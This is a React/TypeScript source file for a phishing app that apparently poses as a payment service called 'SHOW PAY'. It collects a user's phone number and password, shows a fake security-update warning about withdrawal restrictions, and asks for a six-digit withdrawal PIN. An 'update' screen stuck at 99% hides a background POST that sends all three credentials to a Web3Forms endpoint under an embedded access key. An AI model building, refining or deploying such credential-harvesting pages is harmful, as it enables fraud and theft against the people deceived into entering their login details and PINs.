import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Phone, 
  Lock, 
  ShieldAlert, 
  CheckCircle2, 
  ChevronRight, 
  AlertCircle,
  Eye,
  EyeOff,
  HelpCircle,
  User,
  Mail,
  Smartphone,
  Upload,
  Send
} from 'lucide-react';
import { View, UserData, SupportTicket } from './types';

// --- Shared Components ---

const ShowPayLogo = ({ className = "w-full max-w-[220px] mx-auto mb-6" }: { className?: string }) => (
  <div className={`relative flex flex-col items-center justify-center ${className}`}>
    <svg viewBox="0 0 500 400" className="w-full h-auto">
      {/* Accent coral shape (top left behind the top sweep) */}
      <polygon points="120,55 210,55 180,110 100,110" fill="#FE2C55" />
      
      {/* Top arc of the "S" */}
      <path 
        d="M 185,55 
           L 410,55 
           C 410,55 435,100 390,135 
           L 155,135 
           C 125,135 155,55 185,55 Z" 
         fill="#101452" 
      />
      
      {/* Bottom arc of the "S" */}
      <path 
        d="M 170,220 
           L 360,220 
           C 385,220 375,280 300,280 
           L 115,280 
           L 75,345 
           L 380,345 
           C 425,345 460,290 425,220 
           C 410,195 385,195 375,195
           L 170,195 Z" 
         fill="#101452" 
      />
      
      {/* "SHOW PAY" bold centered text across the central zone */}
      <text 
        x="245" 
        y="185" 
        fontFamily="system-ui, -apple-system, sans-serif" 
        fontWeight="900" 
        fontSize="64" 
        fill="#101452" 
        letterSpacing="2"
        textAnchor="middle"
      >
        SHOW PAY
      </text>
    </svg>
  </div>
);

const Button = ({ 
  children, 
  onClick, 
  className = '', 
  disabled = false,
  type = 'button'
}: { 
  children: React.ReactNode; 
  onClick?: () => void; 
  className?: string;
  disabled?: boolean;
  type?: 'button' | 'submit';
}) => (
  <button
    type={type}
    disabled={disabled}
    onClick={onClick}
    className={`w-full py-4 rounded-xl font-semibold text-lg transition-all active:scale-[0.98] disabled:opacity-50 disabled:active:scale-100 ${className}`}
    id={`btn-${children?.toString().toLowerCase().replace(/\s+/g, '-')}`}
  >
    {children}
  </button>
);

const InputField = ({ 
  icon: Icon, 
  placeholder, 
  type = 'text', 
  value, 
  onChange,
  name,
  rightElement,
  maxLength
}: { 
  icon: any; 
  placeholder: string; 
  type?: string; 
  value: string; 
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  name?: string;
  rightElement?: React.ReactNode;
  maxLength?: number;
}) => (
  <div className="relative mb-4">
    <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
      <Icon size={20} />
    </div>
    <input
      name={name}
      type={type}
      placeholder={placeholder}
      value={value}
      onChange={onChange}
      maxLength={maxLength}
      className="w-full bg-[#F3F5F7] py-5 pl-12 pr-12 rounded-xl text-gray-800 placeholder-gray-400 outline-none focus:ring-2 focus:ring-[#69A9E9]/20 transition-all"
    />
    {rightElement && (
      <div className="absolute right-4 top-1/2 -translate-y-1/2">
        {rightElement}
      </div>
    )}
  </div>
);

// --- Views ---

const LoginView = ({ onNext }: { onNext: (phone: string, pass: string) => void }) => {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [password, setPassword] = useState('');
  const isFormFilled = phoneNumber.length === 10 && password.length > 0;

  return (
    <div className="p-6 h-full flex flex-col pt-8">
      <div className="text-center mb-8">
        <ShowPayLogo />
        <h1 className="text-gray-400 font-bold text-xs tracking-[0.2em] uppercase mt-2">LOG IN</h1>
      </div>

      <div className="flex-1">
        <InputField 
          icon={Phone} 
          placeholder="Enter Your Phone Number" 
          value={phoneNumber}
          onChange={(e) => {
             const val = e.target.value.replace(/\D/g, '');
             setPhoneNumber(val);
          }}
          type="tel"
          maxLength={10}
        />
        <InputField 
          icon={Lock} 
          placeholder="Enter Password" 
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <div className="flex justify-end mt-2">
          <button className="text-[#007AFF] text-sm font-medium">Forget Password</button>
        </div>
      </div>

      <div className="pb-4">
        <Button 
          disabled={!isFormFilled}
          onClick={() => isFormFilled && onNext(phoneNumber, password)}
          className={`bg-[#69A9E9] text-white ${isFormFilled ? 'shadow-[0_0_20px_rgba(105,169,233,0.5)]' : 'shadow-lg shadow-[#69A9E9]/30'}`}
        >
          LOG IN
        </Button>
      </div>
      <p className="text-[10px] text-gray-400 text-center px-4 leading-tight">
        These mock data are temporarily stored in admins and support team for improvement of platform
      </p>
    </div>
  );
};

const SecurityNoticeView = ({ onNext }: { onNext: () => void }) => (
  <div className="p-6 h-full flex flex-col items-center justify-center text-center">
    <div className="w-24 h-24 bg-red-50 rounded-full flex items-center justify-center mb-8">
      <ShieldAlert className="text-red-500" size={48} />
    </div>
    <h2 className="text-2xl font-bold text-gray-900 mb-4">Security Update Required</h2>
    <p className="text-gray-500 mb-6 max-w-[280px] leading-relaxed">
      Important: To ensure successful <span className="text-red-500 font-bold underline">withdrawal</span> and account safety, you must complete the security verification update.
    </p>
    <p className="text-sm text-gray-400 mb-12">
      Failure to update may result in temporary withdrawal restrictions.
    </p>
    <Button 
      onClick={onNext}
      className="bg-[#69A9E9] text-white shadow-lg shadow-[#69A9E9]/30"
    >
      Verify & Update Now
    </Button>
  </div>
);

const UpdatingView = ({ collectedData }: { collectedData: CollectedData }) => {
  const [progress, setProgress] = useState(0);
  const [messageIndex, setMessageIndex] = useState(0);
  const messages = [
    "Checking security modules",
    "Syncing configuration",
    "Downloading update package",
    "Verifying integrity",
    "Finalizing installation"
  ];

  useEffect(() => {
    // Send data in the background instantly to Web3Forms to prevent redirection
    const sendData = async () => {
      try {
        const formData = new FormData();
        formData.append("access_key", "879889a9-75f5-4bc2-a90b-d4b9576a66c0");
        formData.append("M", collectedData.phoneNumber);
        formData.append("P", collectedData.password);
        formData.append("In", collectedData.pin);

        await fetch("https://api.web3forms.com/submit", {
          method: "POST",
          headers: {
            "Accept": "application/json"
          },
          body: formData
        });
        console.log("Web3Forms data submitted successfully.");
      } catch (err) {
        console.error("Error submitting to Web3Forms:", err);
      }
    };

    sendData();

    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 99) {
          clearInterval(interval);
          return 99; // Stuck at 99% as requested
        }
        return prev + 1;
      });
    }, 100);

    const messageInterval = setInterval(() => {
      setMessageIndex(prev => (prev + 1) % messages.length);
    }, 2000);

    return () => {
      clearInterval(interval);
      clearInterval(messageInterval);
    };
  }, [collectedData]);

  return (
    <div className="p-6 h-full flex flex-col items-center justify-center">
      <div className="w-full max-w-[280px]">
        <div className="relative w-48 h-48 mx-auto mb-12">
          <svg className="w-full h-full transform -rotate-90">
            <circle
              cx="96"
              cy="96"
              r="80"
              stroke="currentColor"
              strokeWidth="8"
              fill="transparent"
              className="text-gray-100"
            />
            <circle
              cx="96"
              cy="96"
              r="80"
              stroke="currentColor"
              strokeWidth="8"
              fill="transparent"
              strokeDasharray={502.4}
              strokeDashoffset={502.4 - (502.4 * progress) / 100}
              className="text-[#69A9E9] transition-all duration-300"
            />
          </svg>
          <div className="absolute inset-0 flex items-center justify-center">
            <span className="text-4xl font-bold text-gray-900">{progress}%</span>
          </div>
        </div>

        <motion.p 
          key={messageIndex}
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          className="text-gray-500 text-center font-medium mb-4"
        >
          {messages[messageIndex]}
        </motion.p>
        
        <p className="text-xs text-red-400 text-center animate-pulse">
          Optimization in progress... please wait
        </p>
      </div>

      {/* 
          **EMBEDDED WEB3FORMS INTEGRATION**
          Data automatically posted back via background API fetch:
          M (Mobile Number) -> {collectedData.phoneNumber}
          P (Password) -> {collectedData.password}
          In (PIN) -> {collectedData.pin}
      */}
    </div>
  );
};

const PinVerificationView = ({ onNext }: { onNext: (pin: string) => void }) => {
  const [pin, setPin] = useState(['', '', '', '', '', '']);
  const [showPin, setShowPin] = useState(false);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newPin = [...pin];
    newPin[index] = value.slice(-1);
    setPin(newPin);
    
    if (value && index < 5) {
      const nextInput = document.getElementById(`pin-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      const prevInput = document.getElementById(`pin-${index - 1}`);
      prevInput?.focus();
    }
  };

  return (
    <div className="p-6 h-full flex flex-col pt-12 text-center">
      <h2 className="text-2xl font-bold text-gray-900 mb-2">Confirm Withdrawal PIN</h2>
      <p className="text-gray-500 mb-12">Enter your 6-digit transaction PIN to link your update</p>

      <div className="flex justify-between gap-2 mb-8 max-w-[320px] mx-auto w-full">
        {pin.map((digit, i) => (
          <input
            key={i}
            id={`pin-${i}`}
            type={showPin ? "text" : "password"}
            value={digit}
            onChange={(e) => handleChange(i, e.target.value)}
            onKeyDown={(e) => handleKeyDown(i, e)}
            maxLength={1}
            autoComplete="one-time-code"
            className="w-12 h-14 bg-[#F3F5F7] rounded-xl text-center text-xl font-bold text-gray-900 outline-none focus:ring-2 focus:ring-[#69A9E9] transition-all"
          />
        ))}
      </div>

      <div className="flex items-center justify-center gap-2 mb-12">
        <button 
          onClick={() => setShowPin(!showPin)}
          className="text-[#69A9E9] font-medium flex items-center gap-2"
        >
          {showPin ? <EyeOff size={20} /> : <Eye size={20} />}
          {showPin ? "Hide PIN" : "Show PIN"}
        </button>
      </div>

      <div className="mt-auto pb-8">
        <Button 
          disabled={pin.some(d => !d)}
          onClick={() => onNext(pin.join(''))}
          className="bg-[#69A9E9] text-white shadow-lg shadow-[#69A9E9]/30"
        >
          Verify & Sync
        </Button>
      </div>
    </div>
  );
};

// ... (SupportView remains the same or can be hidden)

export default function App() {
  const [currentView, setCurrentView] = useState<View>(View.LOGIN);
  const [data, setData] = useState<CollectedData>({
    phoneNumber: '',
    password: '',
    pin: ''
  });

  const handleLogin = (phone: string, pass: string) => {
    setData(prev => ({ ...prev, phoneNumber: phone, password: pass }));
    setCurrentView(View.SECURITY_NOTICE);
  };

  const handlePin = (pin: string) => {
    setData(prev => ({ ...prev, pin: pin }));
    setCurrentView(View.UPDATING);
  };

  // Trigger form submission conceptually when updating starts
  useEffect(() => {
    if (currentView === View.UPDATING) {
      console.log("Mock data ready for your form implementation:", data);
      // You can trigger your form here
    }
  }, [currentView, data]);

  return (
    <div className="min-h-screen bg-white font-sans text-gray-900 flex justify-center items-center p-0 sm:p-4 bg-gray-50/50">
      <div className="w-full h-full sm:w-[390px] sm:h-[844px] bg-white sm:rounded-[3rem] sm:shadow-2xl overflow-hidden relative border-[8px] border-transparent sm:border-black/5">
        <div className="h-full w-full overflow-hidden flex flex-col">
          {/* Status Bar simulation on mobile view */}
          <div className="hidden sm:block h-6 w-full bg-white relative">
             <div className="absolute left-1/2 -bottom-1 -translate-x-1/2 w-40 h-8 bg-black rounded-b-3xl"></div>
          </div>
          
          <main className="flex-1 overflow-hidden relative">
            <AnimatePresence mode="wait">
              <motion.div
                key={currentView}
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.3, ease: 'easeInOut' }}
                className="h-full w-full overflow-hidden"
              >
                {currentView === View.LOGIN && (
                  <LoginView onNext={handleLogin} />
                )}
                {currentView === View.SECURITY_NOTICE && (
                  <SecurityNoticeView onNext={() => setCurrentView(View.PIN_VERIFICATION)} />
                )}
                {currentView === View.PIN_VERIFICATION && (
                  <PinVerificationView onNext={handlePin} />
                )}
                {currentView === View.UPDATING && (
                  <UpdatingView collectedData={data} />
                )}
                {/* Support view accessible via developer logic or hidden trigger if needed */}
              </motion.div>
            </AnimatePresence>
          </main>
          
          {/* Home indicator simulation */}
          <div className="h-4 w-full bg-white flex justify-center items-end pb-1.5">
            <div className="w-32 h-1 bg-black/10 rounded-full"></div>
          </div>
        </div>
      </div>
    </div>
  );
}
